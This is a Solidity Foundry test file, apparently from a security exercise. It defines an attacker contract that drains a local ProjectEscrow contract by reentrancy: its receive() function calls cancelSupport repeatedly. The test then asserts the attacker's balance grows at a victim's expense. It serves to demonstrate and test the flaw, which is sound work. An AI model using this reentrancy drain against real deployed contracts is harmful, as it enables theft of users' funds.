// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


import "forge-std/Test.sol";           
import "../src/06_ProjectEscrow.sol";

contract ataqueReentrancia{

    ProjectEscrow escrow;
    uint256 tamanyo_ataque;

    constructor(address _escrow) {
        escrow = ProjectEscrow(_escrow);
    }


    function depositar() external payable {
        tamanyo_ataque = msg.value;
        escrow.supportProject{value:msg.value}();
    }

    function llamada_inicial() external {
        escrow.cancelSupport();
    }

    receive() external payable{
        if (address(escrow).balance >=  tamanyo_ataque){
            escrow.cancelSupport();
        }
    }

}

contract ProjectescrowTest is Test{
    ProjectEscrow escrow;
    ataqueReentrancia atacante;
    address victima;

    function setUp() public{
        escrow = new ProjectEscrow();
        atacante = new ataqueReentrancia(address(escrow));
        victima = makeAddr("victima");
        vm.deal(address(victima),9 ether);
        vm.prank(victima);
        escrow.supportProject{value: 9 ether}();
        vm.deal(address(atacante),1 ether);
        atacante.depositar{value:1 ether}();
    }

    function testit() public{
        uint256 balanceAddress = address(atacante).balance;

        atacante.llamada_inicial();

        emit log_named_uint("ETH atacante antes: " , balanceAddress);
        emit log_named_uint("Eth atacante despues" , address(atacante).balance);
        emit log_named_uint("ETH escrow despues: ", address(escrow).balance);
        assertGt(address(atacante).balance, balanceAddress);

    }
}
